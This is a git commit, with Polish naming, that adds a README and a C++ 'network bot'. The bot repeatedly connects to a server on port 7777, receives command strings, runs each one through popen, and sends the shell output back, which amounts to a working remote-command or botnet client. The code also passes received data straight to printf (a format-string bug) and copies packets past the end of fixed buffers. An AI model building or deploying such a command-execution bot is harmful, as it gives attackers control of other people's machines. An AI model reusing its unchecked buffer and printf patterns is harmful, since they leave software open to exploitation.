4932be8d5c8011b322cbe8de52f29feed4cf5698
netcuter <netcuter@gmail.com>
2012-08-19 15:25:56 +0200

    pierwszy

---
+++ README.md
@@ -0,0 +1,1 @@
+program bot sieciowy, ktory laczy sie do serwera, odbiera od niego polecenia, wykonuje odsylajac STDOUT
---
+++ main.cpp
@@ -0,0 +1,213 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netdb.h>
+#include <vector>
+
+#define MAX_SIZE 50
+
+using namespace std;
+
+    class Zadanie
+    {
+    public:
+        int id;
+        char Polecenie[MAX_SIZE];
+
+    };
+
+    class MenadzerZadan
+    {
+        public:
+        vector <Zadanie> Zadania;
+        int DodajZadanie(Zadanie *zadanie);
+        int UsunZadanie(unsigned int nr);
+    };
+
+    class Polaczenie
+    {
+    public:
+        Polaczenie();
+        int Polacz(char *IP, unsigned int port);
+        int Rozlacz();
+        int Zaloguj();
+        int Odbieraj();
+        int Wyslij(char *pakiet);
+        bool Polaczono;
+    private :
+        int sock_descriptor;
+        struct sockaddr_in serwer_addr;
+        struct hostent *server;
+        char pakiet_od_serwera[MAX_SIZE];
+        char pakiet_do_serwera[MAX_SIZE];
+    };
+
+    class Bot
+    {
+    public:
+        Polaczenie polaczenie;
+        int WykonajZadanie(Zadanie * zadanie);
+
+    };
+
+
+MenadzerZadan MZadan;
+
+
+
+    int MenadzerZadan::DodajZadanie(Zadanie *zadanie)
+    {
+
+        Zadanie zad;
+        //zad.id=zadanie->id;
+        zad.id=Zadania.size();
+        strcpy(zad.Polecenie,zadanie->Polecenie);
+        Zadania.push_back(zad);
+        return 1;
+    }
+
+    int MenadzerZadan::UsunZadanie(unsigned int nr)
+    {
+        Zadania.resize(Zadania.size()-1);
+        return 1;
+    }
+
+    int Bot::WykonajZadanie(Zadanie *zadanie)
+    {
+        FILE *STDOUT_procesu;
+                char bufor [1035];
+                printf(zadanie->Polecenie);
+                STDOUT_procesu = popen(zadanie->Polecenie,"r");
+         if (!STDOUT_procesu)
+         {
+           printf("Nie udalo sie uruchomic polecenia\n" );
+           exit;
+         }
+
+         while (fgets(bufor, sizeof(bufor)-1, STDOUT_procesu) && this->polaczenie.Polaczono)
+         {
+             printf("Wyslij(");
+             printf(bufor);
+             polaczenie.Wyslij(bufor);
+             printf(")");
+         }
+         strcpy(bufor,"Wykonano ");
+         strcat(bufor,zadanie->Polecenie);
+         polaczenie.Wyslij(bufor);
+         if(STDOUT_procesu)
+            pclose(STDOUT_procesu);
+        MZadan.UsunZadanie(zadanie->id);
+    }
+
+    Polaczenie::Polaczenie()
+    {
+        this->Polaczono=false;
+    }
+
+    int Polaczenie::Polacz(char *IP, unsigned int port)
+    {
+        sock_descriptor = socket(AF_INET, SOCK_STREAM, 0);
+        if(sock_descriptor < 0)
+          printf("Nie udalo sie utworzyc socketu\n");
+        bzero((char *)&serwer_addr, sizeof(serwer_addr));
+        server = gethostbyname(IP);
+        if(!server)
+        {
+            printf("Nie znaleziono nazwy serwera\n");
+            return -1;
+        }
+        serwer_addr.sin_family = AF_INET;
+        memcpy((char *) &(serwer_addr.sin_addr.s_addr), (char *)(server->h_addr), server->h_length);
+        serwer_addr.sin_port = htons(port);
+        if (connect(sock_descriptor, (struct sockaddr *)&serwer_addr, sizeof(serwer_addr)) < 0)
+        {
+               printf("Polaczenie z serwerem nieudane, proba polaczenia ponownie\n");
+            return 0;
+        }
+        else
+        {
+             printf("Polaczono\n");
+             this->Polaczono=true;
+            return 1;
+        }
+
+    }
+
+    int Polaczenie::Rozlacz()
+    {
+        this->Polaczono = false;
+        return shutdown(this->sock_descriptor,2);
+    }
+
+    int Polaczenie::Zaloguj()
+    {
+        return this->Wyslij("HELLO\0");
+    }
+
+    int Polaczenie::Odbieraj()
+    {
+        int ile = read(sock_descriptor,pakiet_od_serwera,MAX_SIZE);
+        if(ile>0)
+        {
+               // int i = 0;
+                //for(; pakiet_od_serwera[i]!='\n' && i<= strlen(pakiet_od_serwera); ++i)
+                //    ;
+                pakiet_od_serwera[ile]='\0';
+                printf(pakiet_od_serwera);
+                Zadanie * temp = new Zadanie;
+                strncpy(temp->Polecenie,pakiet_od_serwera,ile+1);
+                MZadan.DodajZadanie(temp);
+                delete temp;
+            return 1;
+        }
+        else
+        {
+            this->Rozlacz();
+            return 0;
+
+        }
+    }
+
+    int Polaczenie::Wyslij(char *pakiet)
+    {
+        int count = -1;
+      //  if(sock_descriptor)
+            //count = write(sock_descriptor, pakiet, strlen(pakiet));
+        count = send(sock_descriptor, pakiet, strlen(pakiet),MSG_NOSIGNAL);
+        if(count < 0)
+        {
+            printf("Nie udalo sie wyslac do serwera\n");
+            this->Polaczono=false;
+            return -1;
+        }
+        else
+            if(!count)
+                return 0;
+            else
+                return count;
+    }
+
+int main(int argc, char *argv[])
+{
+   Bot * bot = new Bot;
+   while(1>0)
+   {
+       if(bot->polaczenie.Polacz("localhost",7777))
+       {
+           bot->polaczenie.Zaloguj();
+           while(bot->polaczenie.Polaczono)
+           {
+               if(bot->polaczenie.Odbieraj())
+                   if(MZadan.Zadania.size() > 0)
+                    bot->WykonajZadanie(&MZadan.Zadania[0]);
+           }
+       }
+       sleep(5);
+   }
+   delete bot;
+  return EXIT_SUCCESS;
+}
